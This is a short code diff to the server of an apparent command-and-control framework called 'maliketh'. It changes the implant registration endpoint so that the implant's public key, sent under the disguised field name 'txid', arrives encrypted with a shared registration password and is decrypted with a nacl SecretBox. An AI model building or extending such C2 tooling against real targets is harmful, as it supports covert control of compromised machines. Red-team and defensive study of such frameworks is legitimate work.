@@ -15,6 +15,7 @@ from maliketh.crypto.ec import (
 )
 from maliketh.logging.standard_logger import StandardLogger, LogLevel
 from nacl.encoding import Base64Encoder
+import nacl.secret
 import base64
 
 logger = StandardLogger(sys.stdout, sys.stderr, LogLevel.INFO)
@@ -68,6 +69,8 @@ def hello_c2():
 def register():
     # /register
     # Read implant public key from body
+    # txid is encrypted and base64 encoded with the value in `registration_password`
+    
     """
     {
         "txid": "b64_key_here",
@@ -77,8 +80,19 @@ def register():
     if request.json is None or request.json.get("txid") is None:
         return "Unauthorized", 401
 
-    # Get the implant public key
-    implant_public_key_b64 = request.json["txid"]
+    # Get the (encrypted) implant public key
+    implant_public_key_b64_encrypted = request.json["txid"]
+
+    # Decrypt the implant public key
+    try:
+        key = base64.b64decode(C2_PROFILE.globals.registration_password)
+        box = nacl.secret.SecretBox(key)
+        implant_public_key_b64 = box.decrypt(implant_public_key_b64_encrypted, encoder=Base64Encoder).decode("utf-8")
+    except Exception as e:
+        logger.error(f"{e}")
+        logger.error(f"Failed to decrypt implant public key: {implant_public_key_b64_encrypted}")
+        return "Unauthorized", 401
+
 
     # Check if it's base64
     try:
